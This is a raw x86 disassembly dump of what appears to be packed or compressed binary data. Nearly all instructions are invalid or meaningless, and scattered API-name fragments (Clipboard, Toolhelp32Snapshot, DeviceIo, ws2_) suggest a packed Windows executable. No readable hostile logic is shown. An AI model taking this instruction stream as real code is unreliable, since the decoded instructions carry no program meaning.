  403181:	62 ea 3f             	(bad) {%k1}
  403184:	29 af 3a 30 cd 80    	sub    %ebp,-0x7f32cfc6(%edi)
  40318a:	a0 2e a3 54 9f       	mov    0x9f54a32e,%al
  40318f:	d5 51                	aad    $0x51
  403191:	d1 50 53             	rcll   $1,0x53(%eax)
  403194:	08 6d 9a             	or     %ch,-0x66(%ebp)
  403197:	e4 00                	in     $0x0,%al
  403199:	d6                   	salc
  40319a:	0f b2 1a             	lss    (%edx),%ebx
  40319d:	70 17                	jo     0x4031b6
  40319f:	0f 7b                	(bad)
  4031a1:	cf                   	iret
  4031a2:	d6                   	salc
  4031a3:	dc 67 a0             	fsubl  -0x60(%edi)
  4031a6:	d7                   	xlat   %ds:(%ebx)
  4031a7:	b6 88                	mov    $0x88,%dh
  4031a9:	e1 5c                	loope  0x403207
  4031ab:	51                   	push   %ecx
  4031ac:	b6 79                	mov    $0x79,%dh
  4031ae:	95                   	xchg   %eax,%ebp
  4031af:	5c                   	pop    %esp
  4031b0:	2d 1f d5 be b2       	sub    $0xb2bed51f,%eax
  4031b5:	6c                   	insb   (%dx),%es:(%edi)
  4031b6:	10 ef                	adc    %ch,%bh
  4031b8:	45                   	inc    %ebp
  4031b9:	6c                   	insb   (%dx),%es:(%edi)
  4031ba:	c4 70 ff             	les    -0x1(%eax),%esi
  4031bd:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4031be:	5c                   	pop    %esp
  4031bf:	02 6e bd             	add    -0x43(%esi),%ch
  4031c2:	4d                   	dec    %ebp
  4031c3:	19 00                	sbb    %eax,(%eax)
  4031c5:	ad                   	lods   %ds:(%esi),%eax
  4031c6:	23 0b                	and    (%ebx),%ecx
  4031c8:	6c                   	insb   (%dx),%es:(%edi)
  4031c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ca:	62 61 6c             	bound  %esp,0x6c(%ecx)
  4031cd:	46                   	inc    %esi
  4031ce:	72 65                	jb     0x403235
  4031d0:	65 ec                	gs in  (%dx),%al
  4031d2:	38 e2                	cmp    %ah,%dl
  4031d4:	6d                   	insl   (%dx),%es:(%edi)
  4031d5:	5c                   	pop    %esp
  4031d6:	b5 66                	mov    $0x66,%ch
  4031d8:	e1 40                	loope  0x40321a
  4031da:	72 37                	jb     0x403213
  4031dc:	a3 7b 7a 4c b2       	mov    %eax,0xb24c7a7b
  4031e1:	73 f9                	jae    0x4031dc
  4031e3:	d9 6b 0a             	fldcw  0xa(%ebx)
  4031e6:	77 af                	ja     0x403197
  4031e8:	53                   	push   %ebx
  4031e9:	66 c1 2e 7d          	shrw   $0x7d,(%esi)
  4031ed:	40                   	inc    %eax
  4031ee:	ab                   	stos   %eax,%es:(%edi)
  4031ef:	b9 c1 54 c9 b4       	mov    $0xb4c954c1,%ecx
  4031f4:	ce                   	into
  4031f5:	51                   	push   %ecx
  4031f6:	a3 ae 20 6a 14       	mov    %eax,0x146a20ae
  4031fb:	14 e7                	adc    $0xe7,%al
  4031fd:	04 04                	add    $0x4,%al
  4031ff:	0c cb                	or     $0xcb,%al
  403201:	69 1b b6 87 1a ba    	imul   $0xba1a87b6,(%ebx),%ebx
  403207:	17                   	pop    %ss
  403208:	0f 6d                	(bad)
  40320a:	70 9e                	jo     0x4031aa
  40320c:	29 02                	sub    %eax,(%edx)
  40320e:	4c                   	dec    %esp
  40320f:	69 70 62 6f 61 72 64 	imul   $0x6472616f,0x62(%eax),%esi
  403216:	dc d1                	(bad)
  403218:	c7 c7 10 68 88 90    	mov    $0x90886810,%edi
  40321e:	d9 ea                	fldl2e
  403220:	9a 32 20 68 7a c6 ba 	lcall  $0xbac6,$0x7a682032
  403227:	0f d1 e7             	psrlw  %mm7,%mm4
  40322a:	67 c7                	addr16 (bad)
  40322c:	58                   	pop    %eax
  40322d:	94                   	xchg   %eax,%esp
  40322e:	9c                   	pushf
  40322f:	0f 95 7f dc          	setne  -0x24(%edi)
  403233:	68 0f 3f ff 99       	push   $0x99ff3f0f
  403238:	fe                   	(bad)
  403239:	a0 fd e3 8e 3e       	mov    0x3e8ee3fd,%al
  40323e:	a0 a8 b0 8a e5       	mov    0xe58ab0a8,%al
  403243:	63 44 7d 18          	arpl   %eax,0x18(%ebp,%edi,2)
  403247:	68 b0 44 61 74       	push   $0x746144b0
  40324c:	61                   	popa
  40324d:	97                   	xchg   %eax,%edi
  40324e:	09 cf                	or     %ecx,%edi
  403250:	8a 99 68 af e3 8e    	mov    -0x711c5098(%ecx),%bl
  403256:	3e ac                	lods   %ds:(%esi),%al
  403258:	b4 fc                	mov    $0xfc,%ah
  40325a:	f1                   	int1
  40325b:	b5 f1                	mov    $0xf1,%ch
  40325d:	3b 47 34             	cmp    0x34(%edi),%eax
  403260:	69 b8 a6 0a 77 f4 c0 	imul   $0x966948c0,-0xb88f55a(%eax),%edi
  403267:	48 69 96 
  40326a:	32 b1 1a 49 73 34    	xor    0x3473491a(%ecx),%dh
  403270:	ab                   	stos   %eax,%es:(%edi)
  403271:	38 a1 4d fc 6d 00    	cmp    %ah,0x6dfc4d(%ecx)
  403277:	41                   	inc    %ecx
  403278:	76 61                	jbe    0x4032db
  40327a:	69 6c 61 62 6c 65 80 	imul   $0xc780656c,0x62(%ecx,%eiz,2),%ebp
  403281:	c7 
  403282:	1d 7d 3e c4 cc       	sbb    $0xccc43e7d,%eax
  403287:	9c                   	pushf
  403288:	49                   	dec    %ecx
  403289:	06                   	push   %es
  40328a:	e0 f9                	loopne 0x403285
  40328c:	0f 44 72 61          	cmove  0x61(%edx),%esi
  403290:	67 51                	addr16 push %ecx
  403292:	75 65                	jne    0x4032f9
  403294:	72 79                	jb     0x40330f
  403296:	f9                   	stc
  403297:	9f                   	lahf
  403298:	30 cb                	xor    %cl,%bl
  40329a:	41                   	inc    %ecx
  40329b:	ee                   	out    %al,(%dx)
  40329c:	e8 f3 63 d0 d8       	call   0xd9109694
  4032a1:	1f                   	pop    %ds
  4032a2:	3e a0 3f e4 50 6f    	mov    %ds:0x6f50e43f,%al
  4032a8:	69 6e 74 1c 6a a2 70 	imul   $0x70a26a1c,0x74(%esi),%ebp
  4032af:	47                   	inc    %edi
  4032b0:	1f                   	pop    %ds
  4032b1:	dc e4                	fsub   %st,%st(4)
  4032b3:	2c 6a                	sub    $0x6a,%al
  4032b5:	8f                   	(bad)
  4032b6:	6b ab 61 3d 41 18 0b 	imul   $0xb,0x18413d61(%ebx),%ebp
  4032bd:	41                   	inc    %ecx
  4032be:	6c                   	insb   (%dx),%es:(%edi)
  4032bf:	63 3e                	arpl   %edi,(%esi)
  4032c1:	fb                   	sti
  4032c2:	30 d1                	xor    %dl,%cl
  4032c4:	64 84 73 bf          	test   %dh,%fs:-0x41(%ebx)
  4032c8:	e4 9c                	in     $0x9c,%al
  4032ca:	fb                   	sti
  4032cb:	c7                   	(bad)
  4032cc:	0d 13 a1 f0 70       	or     $0x70f0a113,%eax
  4032d1:	f7 c4 87 e6 80 67    	test   $0x6780e687,%esp
  4032d7:	f4                   	hlt
  4032d8:	9d                   	popf
  4032d9:	7f dc                	jg     0x4032b7
  4032db:	d1 fc                	sar    $1,%esp
  4032dd:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4032de:	0b 2c 1a             	or     (%edx,%ebx,1),%ebp
  4032e1:	f5                   	cmc
  4032e2:	64 4c                	fs dec %esp
  4032e4:	6b c4 43             	imul   $0x43,%esp,%eax
  4032e7:	3e f6 dc             	ds neg %ah
  4032ea:	6a cf                	push   $0xffffffcf
  4032ec:	3a de                	cmp    %dh,%bl
  4032ee:	b0 08                	mov    $0x8,%al
  4032f0:	99                   	cltd
  4032f1:	e8 2b 26 ac f3       	call   0xf3ec5921
  4032f6:	0d 55 6e 6c 7d       	or     $0x7d6c6e55,%eax
  4032fb:	7c f8                	jl     0x4032f5
  4032fd:	58                   	pop    %eax
  4032fe:	20 6b 0c             	and    %ch,0xc(%ebx)
  403301:	ff 0c c3             	decl   (%ebx,%eax,8)
  403304:	1d 14 30 6b 00       	sbb    $0x6b3014,%eax
  403309:	00 00                	add    %al,(%eax)
  40330b:	80 48 1c 25          	orb    $0x25,0x1c(%eax)
  40330f:	61                   	popa
  403310:	34 a5                	xor    $0xa5,%al
  403312:	4a                   	dec    %edx
  403313:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403314:	97                   	xchg   %eax,%edi
  403315:	b7 c4                	mov    $0xc4,%bh
  403317:	83 65 e9 c3          	andl   $0xffffffc3,-0x17(%ebp)
  40331b:	d3 99 e3 f4 25 de    	rcrl   %cl,-0x21da0b1d(%ecx)
  403321:	bc 4d a6 82 07       	mov    $0x782a64d,%esp
  403326:	12 c4                	adc    %ah,%al
  403328:	56                   	push   %esi
  403329:	80 c0 3f             	add    $0x3f,%al
  40332c:	46                   	inc    %esi
  40332d:	61                   	popa
  40332e:	7e 46                	jle    0x403376
  403330:	c2 82 04             	ret    $0x482
  403333:	0d 67 ab 08 00       	or     $0x8ab67,%eax
  403338:	2f                   	das
  403339:	80 48 82 5a          	orb    $0x5a,-0x7e(%eax)
  40333d:	8e d9                	mov    %ecx,%ds
  40333f:	f5                   	cmc
  403340:	30 8a fc 0c 16 b2    	xor    %cl,-0x4de9f304(%edx)
  403346:	77 12                	ja     0x40335a
  403348:	10 0c 11             	adc    %cl,(%ecx,%edx,1)
  40334b:	c6                   	(bad)
  40334c:	72 df                	jb     0x40332d
  40334e:	16                   	push   %ss
  40334f:	cd 63                	int    $0x63
  403351:	92                   	xchg   %eax,%edx
  403352:	9f                   	lahf
  403353:	0c 04                	or     $0x4,%al
  403355:	c9                   	leave
  403356:	07                   	pop    %es
  403357:	9a 05 01 18 02 da de 	lcall  $0xdeda,$0x2180105
  40335e:	e5 df                	in     $0xdf,%eax
  403360:	20 6c 59 36          	and    %ch,0x36(%ecx,%ebx,2)
  403364:	4c                   	dec    %esp
  403365:	34 18                	xor    $0x18,%al
  403367:	da cf                	fcmove %st(7),%st
  403369:	cf                   	iret
  40336a:	d2 88 96 01 1d 2c    	rorb   %cl,0x2c1d0196(%eax)
  403370:	02 28                	add    (%eax),%ch
  403372:	01 04 34             	add    %eax,(%esp,%esi,1)
  403375:	24 20                	and    $0x20,%al
  403377:	40                   	inc    %eax
  403378:	28 ce                	sub    %cl,%dh
  40337a:	be 04 01 39 aa       	mov    $0xaa390104,%esi
  40337f:	6c                   	insb   (%dx),%es:(%edi)
  403380:	5a                   	pop    %edx
  403381:	4b                   	dec    %ebx
  403382:	e2 d3                	loop   0x403357
  403384:	10 f3                	adc    %dh,%bl
  403386:	14 6c                	adc    $0x6c,%al
  403388:	de b1 ee 05 18 99    	fidivs -0x66e7fa12(%ecx)
  40338e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40338f:	05 c4 3a 20 99       	add    $0x99203ac4,%eax
  403394:	24 6c                	and    $0x6c,%al
  403396:	e7 47                	out    %eax,$0x47
  403398:	f7 ad 1c 24 9e 7f    	imull  0x7f9e241c(%ebp)
  40339e:	dc d1                	(bad)
  4033a0:	2c 5c                	sub    $0x5c,%al
  4033a2:	19 22                	sbb    %esp,(%edx)
  4033a4:	d8 b4 94 54 6f 6f 6c 	fdivs  0x6c6f6f54(%esp,%edx,4)
  4033ab:	80 63 03 59          	andb   $0x59,0x3(%ebx)
  4033af:	70 53                	jo     0x403404
  4033b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4033b2:	61                   	popa
  4033b3:	70 73                	jo     0x403428
  4033b5:	f1                   	int1
  4033b6:	a1 fe 15 68 6f       	mov    0x6f6815fe,%eax
  4033bb:	74 94                	je     0x403351
  4033bd:	6c                   	insb   (%dx),%es:(%edi)
  4033be:	30 4f 13             	xor    %cl,0x13(%edi)
  4033c1:	77 f4                	ja     0x4033b7
  4033c3:	38 b0 59 5f b0 e7    	cmp    %dh,-0x184fa0a7(%eax)
  4033c9:	0f 86 69 10 66 72    	jbe    0x72a64438
  4033cf:	73 ff                	jae    0x4033d0
  4033d1:	94                   	xchg   %eax,%esp
  4033d2:	9f                   	lahf
  4033d3:	a9 de a1 7d 9a       	test   $0x9a7da1de,%eax
  4033d8:	9d                   	popf
  4033d9:	3c 99                	cmp    $0x99,%al
  4033db:	f3 8f c9 3a 44       	(bad)
  4033e0:	99                   	cltd
  4033e1:	f8                   	clc
  4033e2:	0e                   	push   %cs
  4033e3:	53                   	push   %ebx
  4033e4:	68 24 e9 a3 8f       	push   $0x8fa3e924
  4033e9:	8f                   	(bad)
  4033ea:	3f                   	aas
  4033eb:	30 6d 48             	xor    %ch,0x48(%ebp)
  4033ee:	50                   	push   %eax
  4033ef:	30 30                	xor    %dh,(%eax)
  4033f1:	7f b8                	jg     0x4033ab
  4033f3:	40                   	inc    %eax
  4033f4:	6d                   	insl   (%dx),%es:(%edi)
  4033f5:	70 96                	jo     0x40338d
  4033f7:	5b                   	pop    %ebx
  4033f8:	d1 74 8e 42          	shll   $1,0x42(%esi,%ecx,4)
  4033fc:	f3 76 4e             	repz jbe 0x40344d
  4033ff:	74 08                	je     0x403409
  403401:	e0 36                	loopne 0x403439
  403403:	96                   	xchg   %eax,%esi
  403404:	53                   	push   %ebx
  403405:	79 65                	jns    0x40346c
  403407:	6d                   	insl   (%dx),%es:(%edi)
  403408:	49                   	dec    %ecx
  403409:	6e                   	outsb  %ds:(%esi),(%dx)
  40340a:	66 e4 84             	data16 in $0x84,%al
  40340d:	d8 b2 69 6f 1f 27    	fdivs  0x271f6f69(%edx)
  403413:	ff 45 78             	incl   0x78(%ebp)
  403416:	88 fc                	mov    %bh,%ah
  403418:	e3 8e                	jecxz  0x4033a8
  40341a:	3e 54                	ds push %esp
  40341c:	5c                   	pop    %esp
  40341d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40341e:	0e                   	push   %cs
  40341f:	83 0c 6e 9a          	orl    $0xffffff9a,(%esi,%ebp,2)
  403423:	4f                   	dec    %edi
  403424:	62 6a f9             	bound  %ebp,-0x7(%edx)
  403427:	f9                   	stc
  403428:	b1 40                	mov    $0x40,%cl
  40342a:	dc 60 e7             	fsubl  -0x19(%eax)
  40342d:	1f                   	pop    %ds
  40342e:	77 f4                	ja     0x403424
  403430:	68 ec 16 a4 60       	push   $0x60a416ec
  403435:	8f                   	(bad)
  403436:	60                   	pusha
  403437:	44                   	inc    %esp
  403438:	65 76 69             	gs jbe 0x4034a4
  40343b:	49                   	dec    %ecx
  40343c:	6f                   	outsl  %ds:(%esi),(%dx)
  40343d:	0c 60                	or     $0x60,%al
  40343f:	86 3e                	xchg   %bh,(%esi)
  403441:	74 6c                	je     0x4034af
  403443:	e3 cf                	jecxz  0x403414
  403445:	d2 b5 24 6e 1d ee    	shlb   %cl,-0x11e291dc(%ebp)
  40344b:	e8 e3 6c 74 3c       	call   0x3cb4a133
  403450:	6e                   	outsb  %ds:(%esi),(%dx)
  403451:	84 63 82             	test   %ah,-0x7e(%ebx)
  403454:	71 4c                	jno    0x4034a2
  403456:	75 70                	jne    0x4034c8
  403458:	f1                   	int1
  403459:	58                   	pop    %eax
  40345a:	f1                   	int1
  40345b:	41                   	inc    %ecx
  40345c:	67 65 51             	addr16 gs push %ecx
  40345f:	24 70                	and    $0x70,%al
  403461:	14 cf                	adc    $0xcf,%al
  403463:	c4 c7 cf 74          	(bad)
  403467:	6e                   	outsb  %ds:(%esi),(%dx)
  403468:	78 e6                	js     0x403450
  40346a:	75 dc                	jne    0x403448
  40346c:	d1 80 8c 41 84 3d    	roll   $1,0x3d84418c(%eax)
  403472:	03 5a 75             	add    0x75(%edx),%ebx
  403475:	54                   	push   %esp
  403476:	16                   	push   %ss
  403477:	79 22                	jns    0x40349b
  403479:	d4 cf                	aam    $0xcf
  40347b:	9f                   	lahf
  40347c:	c9                   	leave
  40347d:	a2 73 c4 ff b8       	mov    %al,0xb8ffc473
  403482:	a3 cf 84 8c dc       	mov    %eax,0xdc8c84cf
  403487:	ad                   	lods   %ds:(%esi),%eax
  403488:	7d 0f                	jge    0x403499
  40348a:	20 11                	and    %dl,(%ecx)
  40348c:	3e be 4c 46 00 14    	ds mov $0x1400464c,%esi
  403492:	6f                   	outsl  %ds:(%esi),(%dx)
  403493:	fc                   	cld
  403494:	e1 8e                	loope  0x403424
  403496:	3e 90                	ds nop
  403498:	98                   	cwtl
  403499:	28 6f 77             	sub    %ch,0x77(%edi)
  40349c:	8a f9                	mov    %cl,%bh
  40349e:	d7                   	xlat   %ds:(%ebx)
  40349f:	b2 8e                	mov    $0x8e,%dl
  4034a1:	77 ac                	ja     0x40344f
  4034a3:	9c                   	pushf
  4034a4:	99                   	cltd
  4034a5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4034a6:	99                   	cltd
  4034a7:	5c                   	pop    %esp
  4034a8:	36 2f                	ss das
  4034aa:	fa                   	cli
  4034ab:	f3 a0 11 be 89 4c    	repz mov 0x4c89be11,%al
  4034b1:	61                   	popa
  4034b2:	fe                   	(bad)
  4034b3:	51                   	push   %ecx
  4034b4:	0c 1b                	or     $0x1b,%al
  4034b6:	45                   	inc    %ebp
  4034b7:	72 72                	jb     0x40352b
  4034b9:	77 f4                	ja     0x4034af
  4034bb:	f1                   	int1
  4034bc:	a1 94 6f a8 b0       	mov    0xb0a86f94,%eax
  4034c1:	95                   	xchg   %eax,%ebp
  4034c2:	e7 1f                	out    %eax,$0x1f
  4034c4:	13 a4 10 44 53 ec 21 	adc    0x21ec5344(%eax,%edx,1),%esp
  4034cb:	c8 6c fa 3f          	enter  $0xfa6c,$0x3f
  4034cf:	c0 18 8f             	rcrb   $0x8f,(%eax)
  4034d2:	0f f5 0f             	pmaddwd (%edi),%mm1
  4034d5:	dc 6f b4             	fsubrl -0x4c(%edi)
  4034d8:	6b da b8             	imul   $0xffffffb8,%edx,%ebx
  4034db:	a3 bc f0 99 e1       	mov    %eax,0xe199f0bc
  4034e0:	69 d4 45 76 3e d4    	imul   $0xd43e7645,%esp,%edx
  4034e6:	b4 a1                	mov    $0xa1,%ah
  4034e8:	74 57                	je     0x403541
  4034ea:	28 70 99             	sub    %dh,-0x67(%eax)
  4034ed:	e1 8e                	loope  0x40347d
  4034ef:	3e c0 c8 38          	ds ror $0x38,%al
  4034f3:	70 1f                	jo     0x403514
  4034f5:	27                   	daa
  4034f6:	99                   	cltd
  4034f7:	eb bc                	jmp    0x4034b5
  4034f9:	ac                   	lods   %ds:(%esi),%al
  4034fa:	e3 1d                	jecxz  0x403519
  4034fc:	cc                   	int3
  4034fd:	99                   	cltd
  4034fe:	d4 99                	aam    $0x99
  403500:	6c                   	insb   (%dx),%es:(%edi)
  403501:	24 ad                	and    $0xad,%al
  403503:	83 fe 22             	cmp    $0x22,%esi
  403506:	4e                   	dec    %esi
  403507:	32 fc                	xor    %ah,%bh
  403509:	59                   	pop    %ecx
  40350a:	50                   	push   %eax
  40350b:	be 0e 13 50 fd       	mov    $0xfd50130e,%esi
  403510:	5b                   	pop    %ebx
  403511:	f9                   	stc
  403512:	92                   	xchg   %eax,%edx
  403513:	1d 9a 31 a4 9f       	sbb    $0x9fa4319a,%eax
  403518:	3f                   	aas
  403519:	9b                   	fwait
  40351a:	f7 b4 d8 d1 fe 71 47 	divl   0x4771fed1(%eax,%ebx,8)
  403521:	e0 c8                	loopne 0x4034eb
  403523:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403524:	03 81 c6 77 73 32    	add    0x327377c6(%ecx),%eax
  40352a:	5f                   	pop    %edi
  40352b:	44                   	inc    %esp
  40352c:	ec                   	in     (%dx),%al
  40352d:	9a 44 06 6f 68 09 e6 	lcall  $0xe609,$0x686f0644
  403534:	a2 72 71 10 71       	mov    %al,0x71107172
  403539:	b8 a3 8f 9f e4       	mov    $0xe49f8fa3,%eax
  40353e:	ec                   	in     (%dx),%al
  40353f:	18 93 ee 18 55 71    	sbb    %dl,0x715518ee(%ebx)
  403545:	4c                   	dec    %esp
  403546:	e3 20                	jecxz  0x403568
  403548:	4f                   	dec    %edi
  403549:	30 c5                	xor    %al,%ch
  40354b:	56                   	push   %esi
  40354c:	8b f1                	mov    %ecx,%esi
  40354e:	b1 6f                	mov    $0x6f,%cl
  403550:	9a 50 71 f0 3f 13 77 	lcall  $0x7713,$0x3ff07150
  403557:	f4                   	hlt
  403558:	f8                   	clc
  403559:	68 c2 76 8e ec       	push   $0xec8e76c2
  40355e:	94                   	xchg   %eax,%esp
  40355f:	0d 94 c7 72 2e       	or     $0x2e72c794,%eax
  403564:	35 14 53 7c 00       	xor    $0x7c5314,%eax
  403569:	02 60 1d             	add    0x1d(%eax),%ah
  40356c:	61                   	popa
  40356d:	5c                   	pop    %esp
  40356e:	3c 43                	cmp    $0x43,%al
  403570:	41                   	inc    %ecx
  403571:	52                   	push   %edx
  403572:	9e                   	sahf
  403573:	96                   	xchg   %eax,%esi
  403574:	14 70                	adc    $0x70,%al
  403576:	54                   	push   %esp
  403577:	2e 4c                	cs dec %esp
  403579:	4e                   	dec    %esi
  40357a:	4b                   	dec    %ebx
  40357b:	00 4d e4             	add    %cl,-0x1c(%ebp)
  40357e:	ba e0 61 00 58       	mov    $0x580061e0,%edx
  403583:	61                   	popa
  403584:	b5 73                	mov    $0x73,%ch
  403586:	90                   	nop
  403587:	36 9a 5e 17 86 92 00 	ss lcall $0xfe00,$0x9286175e
  40358e:	fe 
  40358f:	68 9f 16 43 44       	push   $0x4443169f
  403594:	43                   	inc    %ebx
  403595:	e8 1c 0e cb e2       	call   0xe30b43b6
  40359a:	9c                   	pushf
  40359b:	7c 95                	jl     0x403532
  40359d:	c3                   	ret
  40359e:	72 5b                	jb     0x4035fb
  4035a0:	80 84 1c 0d 18 75 2e 	addb   $0x64,0x2e75180d(%esp,%ebx,1)
  4035a7:	64 
  4035a8:	32 d5                	xor    %ch,%dl
  4035aa:	c4 34 8e             	les    (%esi,%ecx,4),%esi
  4035ad:	9a 6a 5c ab f4 ab f3 	lcall  $0xf3ab,$0xf4ab5c6a
  4035b4:	fc                   	cld
  4035b5:	bd 54 16 5c 47       	mov    $0x475c1654,%ebp
  4035ba:	ad                   	lods   %ds:(%esi),%eax
  4035bb:	70 c4                	jo     0x403581
  4035bd:	4e                   	dec    %esi
  4035be:	d6                   	salc
  4035bf:	db dd                	fcmovnu %st(5),%st
  4035c1:	20 ff                	and    %bh,%bh
  4035c3:	56                   	push   %esi
  4035c4:	ed                   	in     (%dx),%eax
  4035c5:	ff 95 b2 9a 27 26    	call   *0x26279ab2(%ebp)
  4035cb:	5c                   	pop    %esp
  4035cc:	5d                   	pop    %ebp
  4035cd:	53                   	push   %ebx
  4035ce:	e4 9f                	in     $0x9f,%al
  4035d0:	e3 bf                	jecxz  0x403591
  4035d2:	41                   	inc    %ecx
  4035d3:	64 41                	fs inc %ecx
  4035d5:	78 bf                	js     0x403596
  4035d7:	34 9f                	xor    $0x9f,%al
  4035d9:	53                   	push   %ebx
  4035da:	c4 9d 03 ca 61 3c    	les    0x3c61ca03(%ebp),%ebx
  4035e0:	25 3d 03 65 d9       	and    $0xd965033d,%eax
  4035e5:	2e ec                	cs in  (%dx),%al
  4035e7:	72 4b                	jb     0x403634
  4035e9:	7b 2d                	jnp    0x403618
  4035eb:	d8 98 c5 8a ce 63    	fcomps 0x63ce8ac5(%eax)
  4035f1:	7a 55                	jp     0x403648
  4035f3:	5c                   	pop    %esp
  4035f4:	8e 64 e9 ad          	mov    -0x53(%ecx,%ebp,8),%fs
  4035f8:	9e                   	sahf
  4035f9:	a8 4d                	test   $0x4d,%al
  4035fb:	4a                   	dec    %edx
  4035fc:	f5                   	cmc
  4035fd:	13 46 79             	adc    0x79(%esi),%eax
  403600:	d1 7c 3b a7          	sarl   $1,-0x59(%ebx,%edi,1)
  403604:	5b                   	pop    %ebx
  403605:	9c                   	pushf
  403606:	6e                   	outsb  %ds:(%esi),(%dx)
  403607:	64 b8 48 8a 69 55    	fs mov $0x55698a48,%eax
  40360d:	16                   	push   %ss
  40360e:	36 44                	ss inc %esp
  403610:	7f 2b                	jg     0x40363d
  403612:	d1 ad 5d 29 12 0d    	shrl   $1,0xd12295d(%ebp)
  403618:	2b 0d 0e 30 8f cb    	sub    0xcb8f300e,%ecx
  40361e:	5a                   	pop    %edx
  40361f:	53                   	push   %ebx
  403620:	95                   	xchg   %eax,%ebp
  403621:	d1 b4 1c 6f 19 0f 90 	shll   $1,-0x6ff0e691(%esp,%ebx,1)
  403628:	ca 79 25             	lret   $0x2579
  40362b:	51                   	push   %ecx
  40362c:	d5 10                	aad    $0x10
  40362e:	20 df                	and    %bl,%bh
  403630:	03 8a ae 69 ad b7    	add    -0x48529652(%edx),%ecx
  403636:	6e                   	outsb  %ds:(%esi),(%dx)
  403637:	44                   	inc    %esp
  403638:	20 9d 6b b7 13 3a    	and    %bl,0x3a13b76b(%ebp)
  40363e:	56                   	push   %esi
  40363f:	3b f1                	cmp    %ecx,%esi
  403641:	2e 37                	cs aaa
  403643:	57                   	push   %edi
  403644:	bf 68 dd 56 1b       	mov    $0x1b56dd68,%edi
  403649:	25 1e b6 27 61       	and    $0x6127b61e,%eax
  40364e:	e5 72                	in     $0x72,%eax
  403650:	29 a5 6d 9b a8 27    	sub    %esp,0x27a89b6d(%ebp)
  403656:	ed                   	in     (%dx),%eax
  403657:	5a                   	pop    %edx
  403658:	d9 8a 96 cd e8 1a    	(bad) 0x1ae8cd96(%edx)
  40365e:	73 47                	jae    0x4036a7
  403660:	d4 33                	aam    $0x33
  403662:	49                   	dec    %ecx
  403663:	76 61                	jbe    0x4036c6
  403665:	c9                   	leave
  403666:	7f b2                	jg     0x40361a
  403668:	7b 31                	jnp    0x40369b
  40366a:	34 fc                	xor    $0xfc,%al
  40366c:	27                   	daa
  40366d:	3a 06                	cmp    (%esi),%al
  40366f:	33 00                	xor    (%eax),%eax
  403671:	76 23                	jbe    0x403696
  403673:	d4 f3                	aam    $0xf3
  403675:	c2 8c 28             	ret    $0x288c
  403678:	cd 64                	int    $0x64
  40367a:	52                   	push   %edx
  40367b:	59                   	pop    %ecx
  40367c:	f6 6e 74             	imulb  0x74(%esi)
  40367f:	47                   	inc    %edi
  403680:	41                   	inc    %ecx
  403681:	8b 8a 41 32 59 59    	mov    0x59593241(%edx),%ecx
  403687:	c8 79 aa 0e          	enter  $0xaa79,$0xe
  40368b:	4d                   	dec    %ebp
  40368c:	9a 53 ed 42 93 05 9a 	lcall  $0x9a05,$0x9342ed53
  403693:	2c 4f                	sub    $0x4f,%al
  403695:	b1 10                	mov    $0x10,%cl
  403697:	9a 2c 49 b3 68 7b 4e 	lcall  $0x4e7b,$0x68b3492c
  40369e:	96                   	xchg   %eax,%esi
  40369f:	2d 3b 4e 4d ed       	sub    $0xed4d4e3b,%eax
  4036a4:	48                   	dec    %eax
  4036a5:	53                   	push   %ebx
  4036a6:	b0 52                	mov    $0x52,%al
  4036a8:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4036a9:	0b 21                	or     (%ecx),%esp
  4036ab:	19 75 4b             	sbb    %esi,0x4b(%ebp)
  4036ae:	e9 4f f8 5f ea       	jmp    0xeaa02f02
  4036b3:	46                   	inc    %esi
  4036b4:	45                   	inc    %ebp
  4036b5:	c8 62 59 bd          	enter  $0x5962,$0xbd
  4036b9:	53                   	push   %ebx
  4036ba:	57                   	push   %edi
  4036bb:	7a 16                	jp     0x4036d3
  4036bd:	bd a3 4c 3b 97       	mov    $0x973b4ca3,%ebp
  4036c2:	7d cb                	jge    0x40368f
  4036c4:	48                   	dec    %eax
  4036c5:	44                   	inc    %esp
  4036c6:	32 5c 26 cb          	xor    -0x35(%esi,%eiz,1),%bl
  4036ca:	46                   	inc    %esi
  4036cb:	49                   	dec    %ecx
  4036cc:	55                   	push   %ebp
  4036cd:	4f                   	dec    %edi
  4036ce:	ab                   	stos   %eax,%es:(%edi)
  4036cf:	64 cf                	fs iret
  4036d1:	21 92 73 d3 28 1d    	and    %edx,0x1d28d373(%edx)
  4036d7:	59                   	pop    %ecx
  4036d8:	b2 e2                	mov    $0xe2,%dl
  4036da:	2e 69 e6 77 a9 6c 66 	cs imul $0x666ca977,%esi,%esp
  4036e1:	8a 11                	mov    (%ecx),%dl
  4036e3:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4036e4:	63 79 76             	arpl   %edi,0x76(%ecx)
  4036e7:	0f d0                	(bad)
  4036e9:	ae                   	scas   %es:(%edi),%al
  4036ea:	43                   	inc    %ebx
  4036eb:	b4 69                	mov    $0x69,%ah
  4036ed:	64 32 49 8d          	xor    %fs:-0x73(%ecx),%cl
  4036f1:	ee                   	out    %al,(%dx)
  4036f2:	4b                   	dec    %ebx
  4036f3:	f1                   	int1
  4036f4:	47                   	inc    %edi
  4036f5:	b2 e7                	mov    $0xe7,%dl
  4036f7:	55                   	push   %ebp
  4036f8:	55                   	push   %ebp
  4036f9:	ba 4d b1 ec 50       	mov    $0x50ecb14d,%edx
  4036fe:	44                   	inc    %esp
  4036ff:	75 a7                	jne    0x4036a8
  403701:	cd 45                	int    $0x45
  403703:	42                   	inc    %edx
  403704:	65 d5 c8             	gs aad $0xc8
  403707:	62 4f 48             	bound  %ecx,0x48(%edi)
  40370a:	d4 4e                	aam    $0x4e
  40370c:	20 a3 41 82 79 f4    	and    %ah,-0xb867dbf(%ebx)
  403712:	8c 4d 44             	mov    %cs,0x44(%ebp)
  403715:	91                   	xchg   %eax,%ecx
  403716:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403717:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403718:	7f 19                	jg     0x403733
  40371a:	8d                   	lea    (bad),%esp
  40371b:	e7 de                	out    %eax,$0xde
  40371d:	44                   	inc    %esp
  40371e:	16                   	push   %ss
